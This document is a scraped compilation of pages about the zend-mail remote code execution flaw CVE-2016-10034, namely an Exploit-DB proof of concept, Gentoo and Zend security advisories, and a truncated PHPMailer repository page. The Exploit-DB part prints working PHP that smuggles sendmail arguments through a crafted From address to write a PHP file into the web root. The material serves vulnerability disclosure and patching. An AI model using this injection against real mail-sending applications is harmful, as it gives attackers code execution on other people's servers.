=== Content from twitter.com_e3041705_20250126_083811.html ===



=== Content from www.exploit-db.com_82779b38_20250125_124357.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Zend Framework / zend-mail < 2.4.11 - Remote Code Execution

#### EDB-ID:

###### 40979

#### CVE:

###### [2016-10034](https://nvd.nist.gov/vuln/detail/CVE-2016-10034)

---

**EDB Verified:**

#### Author:

###### [Dawid Golunski](/?author=1951)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [PHP](/?platform=php)

#### Date:

###### 2016-12-30

---

**Vulnerable App:**

```
<?php

/*

Zend Framework < 2.4.11    Remote Code Execution (CVE-2016-10034)
zend-mail < 2.4.11
zend-mail < 2.7.2

Discovered/Coded by:

Dawid Golunski
https://legalhackers.com

Full Advisory URL:
https://legalhackers.com/advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034.html

Video PoC
https://legalhackers.com/videos/ZendFramework-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10034-PoC.html

Follow the feed for updates:

https://twitter.com/dawid_golunski

A simple PoC (working on Sendmail MTA)

It will inject the following parameters to sendmail command:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-r]
Arg no. 4 == [attacker\]
Arg no. 5 == [-oQ/tmp/]
Arg no. 6 == [-X/var/www/cache/phpcode.php]
Arg no. 7 == ["@email.com]

which will write the transfer log (-X) into /var/www/cache/phpcode.php file.
Note /var/www/cache must be writable by www-data web user.

The resulting file will contain the payload passed in the body of the msg:

09607 <<< Content-Type: text/html; charset=us-ascii
09607 <<<
09607 <<< <?php phpinfo(); ?>
09607 <<<
09607 <<<
09607 <<<

See the full advisory URL for the exploit details.

*/

// Attacker's input coming from untrusted source such as $_GET , $_POST etc.
// For example from a Contact form with sender field

$email_from = '"attacker\" -oQ/tmp/ -X/var/www/cache/phpcode.php "@email.com';
// encoded phpinfo() php code
$msg_body = base64_decode("PD9waHAgcGhwaW5mbygpOyA/Pg==");

// ------------------

// mail() param injection via the vulnerability in zend-mail

chdir(dirname(__DIR__));
include 'vendor/Zend/Loader/AutoloaderFactory.php';

Zend\Loader\AutoloaderFactory::factory(array(
        'Zend\Loader\StandardAutoloader' => array(
                'autoregister_zf' => true
        )
));

Zend\Mvc\Application::init(require 'config/application.php')->run();

$message        = new \Zend\Mail\Message();

$message->setBody($msg_body);
$message->setFrom($email_from, 'Attacker');
$message->addTo('support@localhost', 'Support');
$message->setSubject('Zend PoC');

$transport  = new \Zend\Mail\Transport\Sendmail();
$transport->send($message);

?>

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

¬©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

√ó

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as ‚ÄúGoogle Hacking‚Äù was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny‚Äôs talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term ‚ÄúGoogledork‚Äù to refer
to ‚Äúa foolish or inept person as revealed by Google‚Äú. This was meant to draw attention to
the fact that this was not a ‚ÄúGoogle problem‚Äù but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term ‚Äúdork‚Äù became shorthand for a search query that located sensitive
information and ‚Äúdorks‚Äù were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

√ó

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

√ó

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from security.gentoo.org_8c0bb41a_20250125_124355.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Zend Framework: Multiple vulnerabilities ‚Äî GLSA **201804-10**

Multiple vulnerabilities have been found in Zend Framework, the
worst of which could allow attackers to remotely execute arbitrary
commands.

### Affected packages

| Package | **dev-php/ZendFramework** on all architectures |
| --- | --- |
| Affected versions | <= **1.12.9** |
| Unaffected versions |  |

### Background

Zend Framework is a high quality and open source framework for
developing Web Applications.

### Description

Multiple vulnerabilities have been discovered in Zend Framework that
have remain unaddressed. Please review the referenced CVE identifiers for
details.

### Impact

Remote attackers could execute arbitrary commands or conduct SQL
injection attacks.

### Workaround

There is no known workaround at this time.

### Resolution

Gentoo has discontinued support for Zend Framework and recommends that
users unmerge the package:

```
 # emerge --unmerge "dev-php/ZendFramework"

```
### References

* [CVE-2016-10034](https://nvd.nist.gov/vuln/detail/CVE-2016-10034)
* [CVE-2016-4861](https://nvd.nist.gov/vuln/detail/CVE-2016-4861)
* [CVE-2016-6233](https://nvd.nist.gov/vuln/detail/CVE-2016-6233)

**Release date**

April 09, 2018

**Latest revision**

April 09, 2018: 2

**Severity**

normal

**Exploitable**

remote

**Bugzilla entries**

* [604182](https://bugs.gentoo.org/show_bug.cgi?id=604182)

### Questions or comments?

Please feel free to contact us.

**¬© 2001‚Äì2020 Gentoo Foundation, Inc.**



=== Content from framework.zend.com_2f584dc3_20250126_083810.html ===


Toggle navigation

[![Zend Framework](../../img/zend-framework-logo.svg)](../../index.html)

* [ABOUT](../../about.1.html)
* [INSTALL](../../downloads.html)
* [DOCUMENTATION](../../learn.html)
* [TRAINING](https://www.zend.com/en/services/training)
* [BLOG](../../blog/index.html)
* [PARTICIPATE](../../participate.html)

### Security

## Security Advisory: ZF2016-04

# ZF2016-04: Potential remote code execution in zend-mail via Sendmail adapter

When using the [zend-mail](https://github.com/zendframework/zend-mail) component
to send email via the `Zend\Mail\Transport\Sendmail` transport, a malicious user
may be able to inject arbitrary parameters to the system sendmail program.
The attack is performed by providing additional quote characters within an
address; when unsanitized, they can be interpreted as additional command line
arguments, leading to the vulnerability.

The following example demonstrates injecting additional parameters to the
sendmail binary via the `From` address:

```
use Zend\Mail;

$mail = new Mail\Message();
$mail->setBody('This is the text of the email.');

// inject additional parameters to sendmail command line
$mail->setFrom('"AAA\" params injection"@domain', 'Sender\'s name');

$mail->addTo('hacker@localhost', 'Name of recipient');
$mail->setSubject('TestSubject');

$transport = new Mail\Transport\Sendmail();
$transport->send($mail);

```

The attack works because zend-mail filters the email addresses using
the [RFC 3696](https://tools.ietf.org/html/rfc3696#section-3) specification,
where the string `"AAA\" params injection"@domain` is considered a valid
address. This validation is provided using the zend-validator component with
the following parameters:

```
Zend\Validator\EmailAddress(
    Zend\Validator\Hostname::ALLOW_DNS | Zend\Validator\Hostname::ALLOW_LOCAL
)

```

The above accepts local domain with any string specified by double quotes as the
local part. While this is valid per RFC 3696, due to the fact that sender email
addresses are provided to the sendmail binary via the command line, they create
the vulnerability described above.

## Action Taken

To fix the issue, we added a transport-specific email filter for the `From`
header in the `Sendmail` transport adapter. The filter checks for the sequence
`\"` in the local part of the email `From` address.

```
$from = $headers->get('From');
if ($from) {
    foreach ($from->getAddressList() as $address) {
        if (preg_match('/\\\"/', $address->getEmail())) {
            throw new Exception\RuntimeException("Potential code injection in From header");
        }
    }
}

```

The patch resolving the vulnerability is available in:

* zend-mail, starting in version 2.7.2
* zend-mail, 2.4.11
* Zend Framework, 2.4.11

Zend Framework 2.5 and 3.0 versions will receive the update automatically, as
executing `composer update` in projects using these versions will update to
zend-mail
2.7.2+.

### Acknowledgments

The Zend Framework team thanks the following for identifying the issues and
working with us to help protect its users:

* The independent security researcher [Dawid Golunski](https://legalhackers.com/),
  who reported the vulnerability to Beyond Security‚Äôs SecuriTeam Secure
  Disclosure program;
* [Enrico Zimuel](http://www.zimuel.it), who provided the patch.

Released 2016-12-20

 [Back to advisories](../advisories/index.html)

* [Overview](../index.html)
* [Advisories](../advisories/index.html)
* [Feed](../feed)

 Have you identified a security vulnerability?

Please report it to us at zf-security@zend.com

**About**

[Overview](../../about.1.html)

[FAQ](../../about/faq.html)

[License](../../license.html)

[Changelog](../../changelog.html)

[Security](../index.html)

[Issues](../../issues.html)

**Install**

[Get started](../../downloads.html)

[MVC skeleton app](../../downloads/skeleton-app.html)

[Expressive skeleton app](../../downloads/expressive.html)

[Archives](../../downloads/latest.html)

**Documentation**

[Overview](../../learn.html)

[Training and Certification](../../learn/training-and-certification/index.html)

[Support and Consulting](../../learn/support-and-consulting/index.html)

[Webinars](http://www.zend.com/en/webinars/recorded/show-by-topic/242_zend%2Bframework)

[Blog](../../blog/index.html)

[Zend Framework 2](../../manual/2.4/en/index.html) - [API](../../docs/api/zf2.html)

[Zend Framework 1](../../manual/1.12/en/manual.html) - [API](../../docs/api/zf1.html)

**Participate**

[Overview](../../participate.html)

[Slack](https://laminas.dev/chat)

[Forums](https://discourse.laminas.dev)

[Contributor guide](../../participate/contributor-guide.html)

[Code Manifesto](../../participate/code-manifesto.html)

[Contributors](../../participate/contributors.html)

[Logos](../../participate/logos.html)

[Get certified](http://www.zend.com/en/services/certification)

[Privacy Policy](https://www.zend.com/privacy-policy)

#### Copyright

¬© 2006-2022 by [Zend](https://www.zend.com) by [Perforce](https://www.perforce.com/). Made with  by awesome [contributors](../../participate/contributors.html).

This website is built using [zend-expressive](https://docs.zendframework.com/zend-expressive/) and it runs on [PHP 7](http://www.zend.com/en/resources/php-7).

#### Contacts

We use cookies to allow you to dismiss dialogs such as the Laminas
Project notification.

Allow Cookies



=== Content from github.com_9b75dead_20250126_083819.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPHPMailer%2FPHPMailer)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPHPMailer%2FPHPMailer)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=PHPMailer%2FPHPMailer)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[PHPMailer](/PHPMailer)
/
**[PHPMailer](/PHPMailer/PHPMailer)**
Public

* [Notifications](/login?return_to=%2FPHPMailer%2FPHPMailer) You must be signed in to change notification settings
* [Fork
  9.7k](/login?return_to=%2FPHPMailer%2FPHPMailer)
* [Star
   21.2k](/login?return_to=%2FPHPMailer%2FPHPMailer)

The classic email sending library for PHP

### License

[LGPL-2.1 license](/PHPMailer/PHPMailer/blob/master/LICENSE)

[21.2k
stars](/PHPMailer/PHPMailer/stargazers) [9.7k
forks](/PHPMailer/PHPMailer/forks) [Branches](/PHPMailer/PHPMailer/branches) [Tags](/PHPMailer/PHPMailer/tags) [Activity](/PHPMailer/PHPMailer/activity)
 [Star](/login?return_to=%2FPHPMailer%2FPHPMailer)

 [Notifications](/login?return_to=%2FPHPMailer%2FPHPMailer) You must be signed in to change notification settings

* [Code](/PHPMailer/PHPMailer)
* [Issues
  36](/PHPMailer/PHPMailer/issues)
* [Pull requests
  11](/PHPMailer/PHPMailer/pulls)
* [Discussions](/PHPMailer/PHPMailer/discussions)
* [Actions](/PHPMailer/PHPMailer/actions)
* [Projects
  0](/PHPMailer/PHPMailer/projects)
* [Wiki](/PHPMailer/PHPMailer/wiki)
* [Security](/PHPMailer/PHPMailer/security)
* [Insights](/PHPMailer/PHPMailer/pulse)

Additional navigation options

* [Code](/PHPMailer/PHPMailer)
* [Issues](/PHPMailer/PHPMailer/issues)
* [Pull requests](/PHPMailer/PHPMailer/pulls)
* [Discussions](/PHPMailer/PHPMailer/discussions)
* [Actions](/PHPMailer/PHPMailer/actions)
* [Projects](/PHPMailer/PHPMailer/projects)
* [Wiki](/PHPMailer/PHPMailer/wiki)
* [Security](/PHPMailer/PHPMailer/security)
* [Insights](/PHPMailer/PHPMailer/pulse)

# PHPMailer/PHPMailer

   ¬†master[Branches](/PHPMailer/PHPMailer/branches)[Tags](/PHPMailer/PHPMailer/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit¬†History[2,454 Commits](/PHPMailer/PHPMailer/commits/master/) | | |
| [.github](/PHPMailer/PHPMailer/tree/master/.github ".github") | | [.github](/PHPMailer/PHPMailer/tree/master/.github ".github") |  |  |
| [.phan](/PHPMailer/PHPMailer/tree/master/.phan ".phan") | | [.phan](/PHPMailer/PHPMailer/tree/master/.phan ".phan") |  |  |
| [docs](/PHPMailer/PHPMailer/tree/master/docs "docs") | | [docs](/PHPMailer/PHPMailer/tree/master/docs "docs") |  |  |
| [examples](/PHPMailer/PHPMailer/tree/master/examples "examples") | | [examples](/PHPMailer/PHPMailer/tree/master/examples "examples") |  |  |
| [language](/PHPMailer/PHPMailer/tree/master/language "language") | | [language](/PHPMailer/PHPMailer/tree/master/language "language") |  |  |
| [src](/PHPMailer/PHPMailer/tree/master/src "src") | | [src](/PHPMailer/PHPMailer/tree/master/src "src") |  |  |
| [test](/PHPMailer/PHPMailer/tree/master/test "test") | | [test](/PHPMailer/PHPMailer/tree/master/test "test") |  |  |
| [.codecov.yml](/PHPMailer/PHPMailer/blob/master/.codecov.yml ".codecov.yml") | | [.codecov.yml](/PHPMailer/PHPMailer/blob/master/.codecov.yml ".codecov.yml") |  |  |
| [.editorconfig](/PHPMailer/PHPMailer/blob/master/.editorconfig ".editorconfig") | | [.editorconfig](/PHPMailer/PHPMailer/blob/master/.editorconfig ".editorconfig") |  |  |
| [.gitattributes](/PHPMailer/PHPMailer/blob/master/.gitattributes ".gitattributes") | | [.gitattributes](/PHPMailer/PHPMailer/blob/master/.gitattributes ".gitattributes") |  |  |
| [.gitignore](/PHPMailer/PHPMailer/blob/master/.gitignore ".gitignore") | | [.gitignore](/PHPMailer/PHPMailer/blob/master/.gitignore ".gitignore") |  |  |
| [COMMITMENT](/PHPMailer/PHPMailer/blob/master/COMMITMENT "COMMITMENT") | | [COMMITMENT](/PHPMailer/PHPMailer/blob/master/COMMITMENT "COMMITMENT") |  |  |
| [LICENSE](/PHPMailer/PHPMailer/blob/master/LICENSE "LICENSE") | | [LICENSE](/PHPMailer/PHPMailer/blob/master/LICENSE "LICENSE") |  |  |
| [README.md](/PHPMailer/PHPMailer/blob/master/README.md "README.md") | | [README.md](/PHPMailer/PHPMailer/blob/master/README.md "README.md") |  |  |
| [SECURITY.md](/PHPMailer/PHPMailer/blob/master/SECURITY.md "SECURITY.md") | | [SECURITY.md](/PHPMailer/PHPMailer/blob/master/SECURITY.md "SECURITY.md") |  |  |
| [UPGRADING.md](/PHPMailer/PHPMailer/blob/master/UPGRADING.md "UPGRADING.md") | | [UPGRADING.md](/PHPMailer/PHPMailer/blob/master/UPGRADING.md "UPGRADING.md") |  |  |
| [VERSION](/PHPMailer/PHPMailer/blob/master/VERSION "VERSION") | | [VERSION](/PHPMailer/PHPMailer/blob/master/VERSION "VERSION") |  |  |
| [changelog.md](/PHPMailer/PHPMailer/blob/master/changelog.md "changelog.md") | | [changelog.md](/PHPMailer/PHPMailer/blob/master/changelog.md "changelog.md") |  |  |
| [composer.json](/PHPMailer/PHPMailer/blob/master/composer.json "composer.json") | | [composer.json](/PHPMailer/PHPMailer/blob/master/composer.json "composer.json") |  |  |
| [get\_oauth\_token.php](/PHPMailer/PHPMailer/blob/master/get_oauth_token.php "get_oauth_token.php") | | [get\_oauth\_token.php](/PHPMailer/PHPMailer/blob/master/get_oauth_token.php "get_oauth_token.php") |  |  |
| [phpcs.xml.dist](/PHPMailer/PHPMailer/blob/master/phpcs.xml.dist "phpcs.xml.dist") | | [phpcs.xml.dist](/PHPMailer/PHPMailer/blob/master/phpcs.xml.dist "phpcs.xml.dist") |  |  |
| [phpdoc.dist.xml](/PHPMailer/PHPMailer/blob/master/phpdoc.dist.xml "phpdoc.dist.xml") | | [phpdoc.dist.xml](/PHPMailer/PHPMailer/blob/master/phpdoc.dist.xml "phpdoc.dist.xml") |  |  |
| [phpunit.xml.dist](/PHPMailer/PHPMailer/blob/master/phpunit.xml.dist "phpunit.xml.dist") | | [phpunit.xml.dist](/PHPMailer/PHPMailer/blob/master/phpunit.xml.dist "phpunit.xml.dist") |  |  |
| View all files | | |

## Repository files navigation

* README
* LGPL-2.1 license
* Security

[![SWUbanner](https://raw.githubusercontent.com/vshymanskyy/StandWithUkraine/main/banner2-direct.svg)](https://supportukrainenow.org/)

[![PHPMailer](https://camo.githubusercontent.com/6d4a0a8d2ca2b19852106a326edc638c302cb7a4bfa3300f83993f5c278762ff/68747470733a2f2f7261772e6769746875622e636f6d2f5048504d61696c65722f5048504d61696c65722f6d61737465722f6578616d706c65732f696d616765732f7068706d61696c65722e706e67)](https://camo.githubusercontent.com/6d4a0a8d2ca2b19852106a326edc638c302cb7a4bfa3300f83993f5c278762ff/68747470733a2f2f7261772e6769746875622e636f6d2f5048504d61696c65722f5048504d61696c65722f6d61737465722f6578616d706c65732f696d616765732f7068706d61696c65722e706e67)

# PHPMailer ‚Äì A full-featured email creation and transfer class for PHP

[![Test status](https://github.com/PHPMailer/PHPMailer/workflows/Tests/badge.svg)](https://github.com/PHPMailer/PHPMailer/actions)
[![codecov.io](https://camo.githubusercontent.com/e8d290abf582d18a91f9275e33b7b4e878742877f72440f283439389073702b5/68747470733a2f2f636f6465636f762e696f2f67682f5048504d61696c65722f5048504d61696c65722f6272616e63682f6d61737465722f67726170682f62616467652e7376673f746f6b656e3d694f525a70776d596d4d)](https://codecov.io/gh/PHPMailer/PHPMailer)
[![Latest Stable Version](https://camo.githubusercontent.com/082a4b469d55b1af070c588210496a9bd0497cb883cbca19dfeaed441e711fab/68747470733a2f2f706f7365722e707567782e6f72672f7068706d61696c65722f7068706d61696c65722f762f737461626c652e737667)](https://packagist.org/packages/phpmailer/phpmailer)
[![Total Downloads](https://camo.githubusercontent.com/b56a00b49d58b84a7b4056742b90914f23635008ec6ed5a067ee975ff815af6c/68747470733a2f2f706f7365722e707567782e6f72672f7068706d61696c65722f7068706d61696c65722f646f776e6c6f616473)](https://packagist.org/packages/phpmailer/phpmailer)
[![License](https://camo.githubusercontent.com/12c0c395cd01dd2fb0aec76e0000c8eb6a0fd6f7b65f9f52b0dbd6f289e60fd3/68747470733a2f2f706f7365722e707567782e6f72672f7068706d61696c65722f7068706d61696c65722f6c6963656e73652e737667)](https://packagist.org/packages/phpmailer/phpmailer)
[![API Docs](https://github.com/phpmailer/phpmailer/workflows/Docs/badge.svg)](https://phpmailer.github.io/PHPMailer/)
